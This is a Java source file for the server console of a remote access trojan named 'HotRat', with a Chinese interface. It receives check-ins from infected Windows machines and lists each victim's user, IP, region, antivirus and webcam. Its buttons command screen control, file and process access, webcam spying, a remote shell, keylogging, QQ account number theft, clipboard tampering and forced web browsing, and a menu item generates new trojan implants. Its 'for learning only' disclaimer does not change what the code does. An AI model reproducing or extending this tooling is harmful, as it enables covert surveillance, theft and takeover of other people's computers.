package me.server;

import com.sun.jna.platform.WindowUtils;
import me.server.createtrojan.CreateTrojan;
import me.server.loadconfig.ConfigReader;
import me.server.loadconfig.ConfigWriter;
import me.server.receive.*;
import me.server.utils.MessageFlags;
import me.server.utils.ReceiveMessage;
import me.server.utils.SendMessage;

import javax.imageio.ImageIO;
import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import java.awt.*;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class Server {
    public static HashMap<String,Socket> map = new HashMap<>();
    public static DefaultTableModel defaultListModel;
    static ServerSocket socket;
    static Socket mesocket;
    static String CFGPATH = System.getProperty("user.dir") + "\\Config.cfg";
    static String LookAndFeel = System.getProperty("user.dir") + "\\LookAndFeel.cfg";
    public static int WINDOWSXP = 0;
    public static int WINDOWS7 = 0;
    public static int WINDOWS10 = 0;
    public static int OTHER = 0;
    public static int ALL = 0;
    public static String port;

    public static void main(String[] args) {
        try {
            System.setProperty("sun.java2d.noddraw", "true");
            File file = new File(LookAndFeel);
            ConfigWriter configWriter1 = new ConfigWriter(LookAndFeel);
            ConfigWriter configWriter = new ConfigWriter(CFGPATH);
            configWriter1.CreateCFG("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
            configWriter.CreateCFG("port","11451");
            JFrame frame = new JFrame("HotRat 私人版 | 当前在线->" + "WindowsXP:" + WINDOWSXP+"  " + "Windows7:"  + WINDOWS7 + "  " + "Windows10/11:" + WINDOWS10 + "  " + "Other:" + OTHER + "  " + "All:" + ALL);
            if(file.exists()) {
                UIManager.setLookAndFeel(ConfigReader.Read(LookAndFeel,"LookAndFeel"));
            }
            port = ConfigReader.Read(CFGPATH,"port");
            JTextArea area = new JTextArea(4, 30);
            area.setBackground(Color.black);
            area.setForeground(Color.green);
            area.setEditable(false);
            Font font = new Font(Font.SERIF,Font.PLAIN,13);
            ImageIcon icon  = new ImageIcon("me/resources/icon.png");
            InputStream inputStream = Server.class.getClassLoader().getResourceAsStream("me/resources/icon.png");
            Image image = ImageIO.read(inputStream);
            InputStream inputStream1 = Server.class.getClassLoader().getResourceAsStream("me/resources/1.png");
            Image image1 = ImageIO.read(inputStream1);
            InputStream inputStream2 = Server.class.getClassLoader().getResourceAsStream("me/resources/2.png");
            Image image2 = ImageIO.read(inputStream2);
            InputStream inputStream3 = Server.class.getClassLoader().getResourceAsStream("me/resources/3.png");
            Image image3 = ImageIO.read(inputStream3);
            InputStream inputStream4 = Server.class.getClassLoader().getResourceAsStream("me/resources/4.png");
            Image image4 = ImageIO.read(inputStream4);
            InputStream inputStream5 = Server.class.getClassLoader().getResourceAsStream("me/resources/5.png");
            Image image5 = ImageIO.read(inputStream5);
            InputStream inputStream6 = Server.class.getClassLoader().getResourceAsStream("me/resources/6.png");
            Image image6 = ImageIO.read(inputStream6);
            InputStream inputStream7 = Server.class.getClassLoader().getResourceAsStream("me/resources/7.png");
            Image image7 = ImageIO.read(inputStream7);
            InputStream inputStream8 = Server.class.getClassLoader().getResourceAsStream("me/resources/8.png");
            Image image8 = ImageIO.read(inputStream8);
            InputStream inputStream10 = Server.class.getClassLoader().getResourceAsStream("me/resources/10.png");
            Image image10 = ImageIO.read(inputStream10);
            InputStream inputStream9 = Server.class.getClassLoader().getResourceAsStream("me/resources/9.png");
            Image image9 = ImageIO.read(inputStream9);
            InputStream inputStream11 = Server.class.getClassLoader().getResourceAsStream("me/resources/11.png");
            Image image11 = ImageIO.read(inputStream11);
            area.setFont(font);
            JScrollPane jScrollPane = new JScrollPane(area);
            area.append("私人版本" + "\n");
            area.append("欢迎使用HotRat远程协助" + "\n");
            area.append("本软件仅供学习交流 请勿用于非法用途 否则后果自负 一切与原作者无关" + "\n");
            area.append("By RedRat Security Team" + "\n");
            area.append("企鹅:511413324" + "\n");
            area.append("监听端口:" + port + "\n");
            frame.setIconImage(image);
            WindowUtils.setWindowAlpha(frame,0.8f);
            JMenuBar bar = new JMenuBar();
            JMenu menu = new JMenu("设置");
            JMenu menu1 = new JMenu("主题");
            JMenuItem jMenuItem = new JMenuItem("软件信息");
            JMenuItem jMenuItem2 = new JMenuItem("监听端口");
            JMenuItem jMenuItem1 = new JMenuItem("退出");
            JMenuItem jMenuItem3 = new JMenuItem("Swing");
            JMenuItem jMenuItem4 = new JMenuItem("Windows");
            JMenuItem jMenuItem5 = new JMenuItem("Motif");
            JMenuItem jMenuItem6 = new JMenuItem("Nimbus");
            JMenuItem jMenuItem7 = new JMenuItem("生成小马");
            JMenuItem jMenuItem8 = new JMenuItem("列表颜色");
            JMenuItem jMenuItem9 = new JMenuItem("Idea");
            frame.add(jScrollPane,BorderLayout.SOUTH);
            JPanel panel = new JPanel();
            JButton button = new JButton("屏幕控制");
            button.setIcon(new ImageIcon(image1));
            JButton button1 = new JButton("文件管理");
            button1.setIcon(new ImageIcon(image2));
            JButton button2 = new JButton("进程管理");
            button2.setIcon(new ImageIcon(image3));
            JButton button3 = new JButton("视频监控");
            button3.setIcon(new ImageIcon(image4));
            JButton button4 = new JButton("窗口查看");
            button4.setIcon(new ImageIcon(image5));
            JButton button5 = new JButton("远程命令");
            button5.setIcon(new ImageIcon(image6));
            JButton button6 = new JButton("键盘监听");
            button6.setIcon(new ImageIcon(image7));
            JButton button7 = new JButton("远程聊天");
            button7.setIcon(new ImageIcon(image8));
            JButton button8 = new JButton("更多功能");
            button8.setIcon(new ImageIcon(image9));
            JButton button9 = new JButton("解除主机");
            button9.setIcon(new ImageIcon(image10));
            JButton button10 = new JButton("系统信息");
            button10.setIcon(new ImageIcon(image11));
            JToolBar jToolBar = new JToolBar();
            jToolBar.add(button);
            jToolBar.add(button1);
            jToolBar.add(button2);
            jToolBar.add(button3);
            jToolBar.add(button4);
            jToolBar.add(button5);
            jToolBar.add(button6);
            jToolBar.add(button10);
            jToolBar.add(button7);
            jToolBar.add(button9);
            jToolBar.add(button8);
            jToolBar.setFloatable(false);
            panel.add(jToolBar);
            menu.add(jMenuItem);
            menu.add(jMenuItem2);
            menu.add(jMenuItem7);
            menu.add(jMenuItem8);
            menu.add(jMenuItem1);
            menu1.add(jMenuItem3);
            menu1.add(jMenuItem4);
            menu1.add(jMenuItem5);
            menu1.add(jMenuItem6);
            menu1.add(jMenuItem9);
            bar.add(menu);
            bar.add(menu1);
            frame.setResizable(false);
            JScrollPane scrollPane = new JScrollPane();
            defaultListModel = new DefaultTableModel(null,new String[]{"用户名称","计算机名称","操作系统","IP地址","地区","上线时间","小马名称","进程ID","摄像头","杀毒软件"});
            JTable table = new JTable(defaultListModel){
                @Override
                public boolean isCellEditable(int row, int column) {
                    return false;
                }
            };
            table.setFillsViewportHeight(true);
            table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
            table.getColumnModel().getColumn(0).setPreferredWidth(150);
            table.getColumnModel().getColumn(1).setPreferredWidth(150);
            table.getColumnModel().getColumn(2).setPreferredWidth(100);
            table.getColumnModel().getColumn(3).setPreferredWidth(150);
            table.getColumnModel().getColumn(4).setPreferredWidth(120);
            table.getColumnModel().getColumn(5).setPreferredWidth(90);
            table.getColumnModel().getColumn(6).setPreferredWidth(100);
            table.getColumnModel().getColumn(7).setPreferredWidth(100);
            table.getColumnModel().getColumn(8).setPreferredWidth(100);
            table.getColumnModel().getColumn(9).setPreferredWidth(190);
            table.setShowHorizontalLines(false);
            table.setShowVerticalLines(false);
            table.getTableHeader().setReorderingAllowed(false);
            table.getTableHeader().setResizingAllowed(false);
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            table.setRowHeight(20);
            scrollPane.setViewportView(table);
            frame.add(panel,BorderLayout.NORTH);
            frame.add(scrollPane);
            frame.setJMenuBar(bar);
            frame.setVisible(true);
            frame.setSize(1250,700);
            frame.setLocationRelativeTo(null);
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            ExecutorService executorService = Executors.newCachedThreadPool();
            jMenuItem.addActionListener(a->{
                JOptionPane.showMessageDialog(null,"By HotRat Security Team","版本信息",JOptionPane.INFORMATION_MESSAGE);
            });
            jMenuItem1.addActionListener(a->{
                System.exit(0);
            });
            jMenuItem2.addActionListener(a ->{
               String str = JOptionPane.showInputDialog(null,"请输入监听的端口号","监听",JOptionPane.QUESTION_MESSAGE);
               configWriter.Write("port",str);
                JOptionPane.showMessageDialog(null,"端口已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem3.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","javax.swing.plaf.metal.MetalLookAndFeel");
                    JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem4.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
                    JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem5.addActionListener(a->{
                try {
                    configWriter1.Write("LookAndFeel","com.sun.java.swing.plaf.motif.MotifLookAndFeel");
                    JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                    System.exit(0);
                }catch (Exception e) {
                }
            });
            jMenuItem6.addActionListener(a->{
                configWriter1.Write("LookAndFeel","javax.swing.plaf.nimbus.NimbusLookAndFeel");
                JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem9.addActionListener(a->{
                configWriter1.Write("LookAndFeel","com.formdev.flatlaf.FlatDarkLaf");
                JOptionPane.showMessageDialog(null,"主题已经更改,请重启软件","提示",JOptionPane.WARNING_MESSAGE);
                System.exit(0);
            });
            jMenuItem7.addActionListener(a->{
                CreateTrojan.Create();
            });
            jMenuItem8.addActionListener(a->{
                String[] modes = {"黑色","红色","蓝色"};
                String mode = (String) JOptionPane.showInputDialog(null,"列表颜色","颜色",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                switch (mode) {
                    case "黑色":
                        table.setForeground(new Color(0,0,0));
                        table.repaint();
                        frame.repaint();
                        break;
                    case "红色":
                        table.setForeground(new Color(255,0,0));
                        table.repaint();
                        frame.repaint();
                        break;
                    case "蓝色":
                        table.setForeground(new Color(0,0,255));
                        table.repaint();
                        frame.repaint();
                        break;
                }
            });
            button.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        SendMessage.SendHead(MessageFlags.SHOW_SCREEN,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button1.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        SendMessage.SendHead(MessageFlags.SHOW_FILEWINDOW,map.get(str));
                        SendMessage.SendHead(MessageFlags.DISK_QUERT,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button2.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                            SendMessage.SendHead(MessageFlags.SHOW_TASKLIST,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button3.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                    SendMessage.SendHead(MessageFlags.SHOW_CAMERA,map.get(str));
                }).start();
                }catch (Exception e) {
                }
            });
            button4.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        SendMessage.SendHead(MessageFlags.SHOW_ENUM_WINDOWS,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button5.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        SendMessage.SendHead(MessageFlags.SHOW_REMOTE_CMD,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button6.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                    SendMessage.SendHead(MessageFlags.SHOW_KEYBORADWINDOW,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button7.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        SendMessage.SendHead(MessageFlags.SHOW_REMOTECHAT,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button10.addActionListener(a->{
                try {
                    new Thread(() -> {
                        int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        SendMessage.SendHead(MessageFlags.SHOW_SYSTEMINFO,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            button8.addActionListener(a->{
                try {
                    new Thread(() -> {
                        String[] modes = {"远程弹窗","远程获取QQ号","蜂鸣器","剪切板修改","闪屏","网页打开","转移主机"};
                        String mode = (String) JOptionPane.showInputDialog(null,"更多功能","更多",JOptionPane.QUESTION_MESSAGE,null,modes,modes[0]);
                        int temp = table.getSelectedRow();
                        String strings = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                        switch (mode) {
                            case "蜂鸣器":
                                    SendMessage.SendHead(MessageFlags.BUZZER,map.get(strings));
                                break;
                            case "远程弹窗":
                                    new MessageBox(mesocket);
                                break;
                            case "远程获取QQ号":
                                SendMessage.SendHead(MessageFlags.SHOW_QQNUMBERWINDOW,map.get(strings));
                                break;
                            case "剪切板修改":
                                SendMessage.SendHead(MessageFlags.SHOW_CLIPBORADWINDOW,map.get(strings));
                                break;
                            case "闪屏":
                                    String str =JOptionPane.showInputDialog(null,"闪屏文字..","闪屏",JOptionPane.INFORMATION_MESSAGE);
                                    SendMessage.Send(MessageFlags.FLASH_SCREEN,str.getBytes(),map.get(strings));
                                break;
                            case "网页打开":
                                    String strs =JOptionPane.showInputDialog(null,"输入URL(如: http://baidu.com/)","输入",JOptionPane.INFORMATION_MESSAGE);
                                    SendMessage.Send(MessageFlags.WEB_BROWSE,strs.getBytes(),map.get(strings));
                                break;
                            case "转移主机":
                                LoadNewHost.Load(map.get(strings));
                                break;
                        }
                    }).start();
                }catch (Exception e) {
                }
            });
            button9.addActionListener(a->{
                try {
                    new Thread(() -> {
                    int temp = table.getSelectedRow();
                        String str = (String) table.getValueAt(temp,0) + "$" + (String)table.getValueAt(temp,1) + "$"+ (String)table.getValueAt(temp,2) + "$" + (String)table.getValueAt(temp,3)
                                + "$" + (String)table.getValueAt(temp,4) + "$" + (String)table.getValueAt(temp,5) + "$" + (String)table.getValueAt(temp,6)+ "$" + (String)table.getValueAt(temp,7)
                                + "$" + (String)table.getValueAt(temp,8)+ "$" + (String)table.getValueAt(temp,9);
                            JOptionPane.showMessageDialog(null,"解除成功!","解除",JOptionPane.INFORMATION_MESSAGE);
                            SendMessage.SendHead(MessageFlags.RELIEVE,map.get(str));
                    }).start();
                }catch (Exception e) {
                }
            });
            socket = new ServerSocket(Integer.parseInt(port));
            while (true) {
                mesocket = socket.accept();
                executorService.execute(new ClientPage(mesocket,defaultListModel,frame,area,table));
            }
        }catch (Exception e) {
        }
    }
    public static void flashTable(JTable table,DefaultTableModel defaultTableModel) {
        for(int index = table.getModel().getRowCount() - 1; index >= 0; index--) {
            defaultTableModel.removeRow(index);
        }
        Set<String> hashSet = Server.map.keySet();
        for(String context:hashSet) {
            String[] strings = context.split("\\$");
            defaultTableModel.addRow(strings);
        }
    }
}

class ClientPage implements Runnable{
   static Socket mesocket;
    DefaultTableModel tableModel;
    JFrame frame;
    JTable table;
    static JTextArea area;
    public ClientPage(Socket socket,DefaultTableModel tableModel,JFrame frame,JTextArea textArea,JTable table) {
        mesocket = socket;
        area = textArea;
        this.table = table;
        this.tableModel = tableModel;
        this.frame = frame;
    }
    @Override
    public void run() {
        try {
            DataInputStream dataInputStream = new DataInputStream(mesocket.getInputStream());
            String head = "H0tRAT";
            String str1 = dataInputStream.readUTF();
            String str2 = dataInputStream.readUTF();
            String str3 = dataInputStream.readUTF();
            String str4 = dataInputStream.readUTF();
            String str5 = dataInputStream.readUTF();
            String str6 = dataInputStream.readUTF();
            String str7 = dataInputStream.readUTF();
            String str8 = dataInputStream.readUTF();
            String str9 = dataInputStream.readUTF();
            String str10 = dataInputStream.readUTF();
            if(!str1.contains(head)) {
                return;
            }
            Date date = new Date();
            SimpleDateFormat format = new SimpleDateFormat("hh:mm:ss");
            SystemDisplay(str2,str3);
            String[] strings = new String[]{
                    str2,str3,str4,str5,str6,format.format(date),str7,str8,str9,str10
            };
            String context = strings[0] + "$" + strings[1] + "$" + strings[2] + "$" + strings[3] + "$" + strings[4] + "$" + strings[5] + "$" + strings[6]
                    + "$" + strings[7]+ "$" + strings[8] + "$" + strings[9];
            Server.map.put(context,mesocket);
            Server.flashTable(table,tableModel);
            area.append("ip: [" + str5  + "]" +"有新主机上线请注意! 时间:"  +  format.format(date)  + "\n");
            frame.setSize(1251,701);//强制刷新
            frame.setSize(1250,700);
            frame.repaint();
            if(str4.toLowerCase().indexOf("xp")!=-1) {
                Server.WINDOWSXP++;
                Server.ALL++;
                frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            } else if (str4.toLowerCase().indexOf("7")!=-1) {
                Server.WINDOWS7++;
                Server.ALL++;
                frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            }else if (str4.toLowerCase().indexOf("10")!=-1 || str4.toLowerCase().indexOf("11")!=-1) {
                Server.WINDOWS10++;
                Server.ALL++;
                frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            }else {
                Server.OTHER++;
                Server.ALL++;
                frame.setTitle("HotRat 私人版 | 当前在线->" + "WindowsXP:" + Server.WINDOWSXP+"  " + "Windows7:"  + Server.WINDOWS7 + "  " + "Windows10/11:" + Server.WINDOWS10 + "  " + "Other:" + Server.OTHER+ "  " + "All:" + Server.ALL);
            }
            new SendHeartPack(mesocket,frame,area,str4,strings,table,tableModel,context).start();
            new ReceiveMessage(mesocket,str5).start();
        }catch (Exception e) {
            e.printStackTrace();
        }
    }
    public void SystemDisplay(String str,String str2) throws AWTException {
        SystemTray systemTray = SystemTray.getSystemTray();
        Image image = Toolkit.getDefaultToolkit().createImage("icon.png");
        TrayIcon trayIcon = new TrayIcon(image);
        systemTray.add(trayIcon);
        trayIcon.displayMessage("新主机上线",str + "\n" + str2, TrayIcon.MessageType.INFO);
    }
}